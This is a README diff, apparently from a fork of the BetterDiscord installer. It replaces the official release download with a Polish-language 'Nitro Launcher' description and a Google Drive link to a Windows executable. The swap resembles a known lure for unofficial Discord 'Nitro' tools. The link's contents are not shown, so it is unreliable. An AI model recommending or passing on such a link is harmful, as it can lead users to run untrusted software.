@@ -2,7 +2,7 @@
 
 ## Downloads
 
-These will link you to the latest builds found in the [releases](https://github.com/BetterDiscord/installer/releases/) tab of this repository.
+Nitro Launcher Downloader/Updater, Program do instalowania i aktualizowania Pluginu Nitro.
 
-| [Windows (7+)](https://github.com/BetterDiscord/Installer/releases/latest/download/BetterDiscord-Windows.exe)  | [macOS (10.10+)]() | [Linux]() |
+| [Windows (7+)](https://drive.google.com/uc?export=download&id=1oLoIftuau8gDkaPdjU64lgn_2CAXaPfT)  | [macOS (10.10+)](https://github.com/GRAJRP/NitroLauncher) | [Linux](https://github.com/GRAJRP/NitroLauncher) |
 | ------------- | ------------- | ------------- |
